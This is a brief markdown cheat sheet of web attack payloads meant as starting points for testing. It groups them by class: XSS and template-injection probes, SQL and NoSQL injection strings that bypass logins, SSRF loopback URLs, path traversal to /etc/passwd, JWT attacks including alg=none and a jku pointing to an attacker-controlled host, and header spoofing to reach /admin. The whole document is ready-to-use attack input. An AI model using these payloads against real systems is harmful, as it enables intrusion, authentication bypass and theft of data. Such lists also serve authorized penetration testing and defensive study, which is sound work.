# Web Payload Seeds

These are starting points, not final exploits. Always confirm context first.

## Reflection / HTML

```text
<test>
"'><svg/onload=alert(1)>
{{7*7}}
${7*7}
```

## SQLi

```text
'
"
' OR '1'='1'--
' AND '1'='2'--
1 OR 1=1
1 AND 1=2
```

## NoSQLi JSON

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}
```

## SSRF

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://2130706433/
http://allowed.example@127.0.0.1/
```

## Traversal

```text
../
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
```

## JWT

```text
alg=none
kid=../../../../dev/null
jku=https://attacker-controlled/jwks.json
```

## Headers

```text
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Original-URL: /admin
X-Rewrite-URL: /admin
```
